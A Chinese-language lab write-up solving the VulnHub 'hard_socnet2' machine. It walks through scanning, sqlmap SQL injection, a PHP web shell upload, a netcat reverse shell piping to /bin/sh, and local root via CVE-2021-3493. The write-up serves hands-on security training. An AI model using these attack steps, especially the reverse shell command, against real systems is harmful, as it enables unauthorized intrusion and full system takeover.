---
title: 03vulnhub-hard_socnet2
date: 2023-09-17 16:20:35
tags:
- 靶场
categories:
- 靶场
---

# 下载地址

 https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova



# 靶机目标

获取靶机root权限



# 详细步骤




## 主机发现

```
arp-scan -l -I eth1
```

![image-20230917163604722](../资源文件/图片/image-20230917163604722.png)

然后扫描端口

```
nmap -sV -p- 192.168.56.109
```

![image-20230917163630729](../资源文件/图片/image-20230917163630729.png)

发现80，8000都是开放的，访问80端口



## web信息收集

![image-20230917163754246](../资源文件/图片/image-20230917163754246.png)

发现有登录和注册功能，尝试弱口令和万能密码，无果，注册一个账号试试看

注册后，成功进入界面，测试功能点，发现主页可以上传文件，搜索框存在sql注入

![image-20230917164139202](../资源文件/图片/image-20230917164139202.png)

![image-20230917164221569](../资源文件/图片/image-20230917164221569.png)

先尝试sql注入，直接用sqlmap跑

发现能跑出所有数据

![image-20230918165631466](../资源文件/图片/image-20230918165631466.png)

发现有管理员的账号和密码，但是登录后无果

随后发现文件上传点

![image-20230918165744131](../资源文件/图片/image-20230918165744131.png)

可以直接上传.php木马

通过蚁剑连接

![image-20230918165833247](../资源文件/图片/image-20230918165833247.png)

查看用户权限，发现是普通用户权限，尝试提权

使用CVE-2021-3493漏洞提权

![image-20230918170304999](../资源文件/图片/image-20230918170304999.png)

把exploit.c传入/var/tmp目录下

在蚁剑的虚拟终端反弹shell进一步提升可操作权限

![image-20230918170833512](../资源文件/图片/image-20230918170833512.png)

目标机

```
nc 192.168.56.103 7777 | /bin/sh | nc 192.168.56.103 8888 
```

kali机

```
nc -lvvp 7777
nc -lvvp 8888
```

进入/var/tmp目录下，编译exploit.c

```
gcc -o exp exploit.c
```

给权限并运行

```
chmod +x exp
./exp
```

![image-20230918172431434](../资源文件/图片/image-20230918172431434.png)

成功取得root权限！
